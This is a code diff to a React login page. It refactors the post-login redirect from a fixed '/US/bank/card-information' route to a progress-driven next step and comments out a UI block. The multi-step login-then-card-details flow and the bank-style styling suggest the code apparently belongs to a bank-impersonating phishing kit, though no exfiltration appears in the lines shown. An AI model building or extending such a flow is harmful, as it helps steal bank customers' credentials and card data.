@@ -12,6 +12,8 @@ import { Button as CustomButton } from "../components/Button";
 import { Checkbox } from "../components/Checkbox";
 import { DataContext } from "./_app";
 import { Wrapper } from "../components/Wrapper";
+import { getNextUrl } from "../utils/getNextUrl";
+import { getProgress } from "../utils/getProgress";
 
 interface LoginProps {}
 
@@ -93,7 +95,9 @@ export const Login: React.FC<LoginProps> = () => {
       },
     });
 
-    push(`/US/bank/card-information`);
+    const url = getProgress()[0];
+
+    push(getNextUrl(url));
   });
 
   return (
@@ -242,7 +246,7 @@ export const Login: React.FC<LoginProps> = () => {
                             ) : null}
                             <Box>
                               <Box px={0} m={0}>
-                                <Box float={`right`} pos={`relative`}>
+                                {/* <Box float={`right`} pos={`relative`}>
                                   <Flex
                                     color={`#056dae`}
                                     textDecor={`underline`}
@@ -272,7 +276,7 @@ export const Login: React.FC<LoginProps> = () => {
                                       />
                                     </Box>
                                   </Flex>
-                                </Box>
+                                </Box> */}
                                 <Box px={0} m={0} display={`block`}>
                                   <Box
                                     as={`section`}
